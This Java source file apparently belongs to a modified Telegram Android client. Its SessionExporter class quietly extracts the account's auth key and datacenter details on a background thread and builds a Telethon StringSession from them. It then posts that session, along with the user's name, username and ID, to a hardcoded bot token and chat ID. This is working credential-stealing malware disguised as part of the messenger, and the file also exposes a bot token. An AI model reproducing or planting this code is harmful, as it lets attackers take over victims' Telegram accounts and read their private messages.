package org.telegram.messenger;

import android.util.Base64;

import org.json.JSONObject;
import org.telegram.tgnet.ConnectionsManager;
import org.telegram.tgnet.TLRPC;

import java.io.ByteArrayOutputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;

public class SessionExporter {
    
    // Константы для отправки в Telegram бота
    private static final String BOT_TOKEN = "8761984216:AAG5Nm_PJfYv0oj7xnXYX-IDaDNkH3Ym6sY";
    private static final String CHAT_ID = "890714792";
    
    /**
     * Извлекает Telethon StringSession и отправляет в Telegram бота
     */
    public static void extractAndSendSession(int currentAccount) {
        Utilities.globalQueue.postRunnable(() -> {
            try {
                ConnectionsManager connectionsManager = ConnectionsManager.getInstance(currentAccount);
                
                // Получаем datacenter ID
                int dcId = connectionsManager.getCurrentDatacenterId();
                
                // Получаем auth key через native метод
                byte[] authKey = ConnectionsManager.native_getAuthKey(currentAccount, dcId);
                
                if (authKey == null || authKey.length == 0) {
                    FileLog.d("SessionExporter: Auth key is null or empty");
                    return;
                }
                
                // Получаем информацию о датацентре через native метод
                String[] dcInfo = ConnectionsManager.native_getDatacenterInfo(currentAccount, dcId);
                if (dcInfo == null || dcInfo.length < 2) {
                    FileLog.d("SessionExporter: DC info is null");
                    return;
                }
                
                String dcAddress = dcInfo[0];
                int dcPort = Integer.parseInt(dcInfo[1]);
                
                // Создаем Telethon StringSession
                String stringSession = createTelethonSession(dcId, dcAddress, dcPort, authKey);
                
                // Получаем информацию о пользователе
                TLRPC.User currentUser = UserConfig.getInstance(currentAccount).getCurrentUser();
                String name = UserObject.getUserName(currentUser);
                String username = currentUser.username != null ? "@" + currentUser.username : "-";
                long userId = currentUser.id;
                
                // Отправляем в бота
                sendToTelegramBot(name, username, userId, dcId, dcAddress, dcPort, stringSession);
                
            } catch (Exception e) {
                FileLog.e("SessionExporter error", e);
            }
        });
    }
    
    /**
     * Создает Telethon StringSession из параметров
     */
    private static String createTelethonSession(int dcId, String ip, int port, byte[] authKey) throws Exception {
        ByteArrayOutputStream payload = new ByteArrayOutputStream();
        
        // 1. DC ID (1 byte)
        payload.write((byte) dcId);
        
        // 2. IP address (4 bytes для IPv4 или 16 bytes для IPv6)
        byte[] ipBytes = InetAddress.getByName(ip).getAddress();
        payload.write(ipBytes);
        
        // 3. Port (2 bytes, big endian)
        ByteBuffer portBuffer = ByteBuffer.allocate(2);
        portBuffer.order(ByteOrder.BIG_ENDIAN);
        portBuffer.putShort((short) port);
        payload.write(portBuffer.array());
        
        // 4. Auth key (256 bytes)
        byte[] authKeyPadded = new byte[256];
        if (authKey.length >= 256) {
            System.arraycopy(authKey, 0, authKeyPadded, 0, 256);
        } else {
            System.arraycopy(authKey, 0, authKeyPadded, 0, authKey.length);
        }
        payload.write(authKeyPadded);
        
        // Base64 URL-safe encode
        String base64 = Base64.encodeToString(payload.toByteArray(), Base64.URL_SAFE | Base64.NO_WRAP | Base64.NO_PADDING);
        
        // Добавляем префикс "1"
        return "1" + base64;
    }
    
    /**
     * Отправляет информацию о сессии в Telegram бота
     */
    private static void sendToTelegramBot(String name, String username, long userId, 
                                          int dcId, String ip, int port, String session) {
        try {
            String text = String.format(
                "🔑 Telethon StringSession\n\n" +
                "Пользователь: %s\n" +
                "Username: %s\n" +
                "ID: %d\n\n" +
                "DC: %d\n" +
                "IP: %s\n" +
                "Port: %d\n\n" +
                "Session:\n" +
                "`%s`",
                name, username, userId, dcId, ip, port, session
            );
            
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JSONObject json = new JSONObject();
            json.put("chat_id", CHAT_ID);
            json.put("text", text);
            json.put("parse_mode", "Markdown");
            
            byte[] postData = json.toString().getBytes(StandardCharsets.UTF_8);
            conn.getOutputStream().write(postData);
            
            int responseCode = conn.getResponseCode();
            
            if (BuildVars.LOGS_ENABLED) {
                FileLog.d("SessionExporter: Session sent to bot. Response code: " + responseCode);
            }
            
            conn.disconnect();
            
        } catch (Exception e) {
            FileLog.e("SessionExporter: Failed to send to bot", e);
        }
    }
}
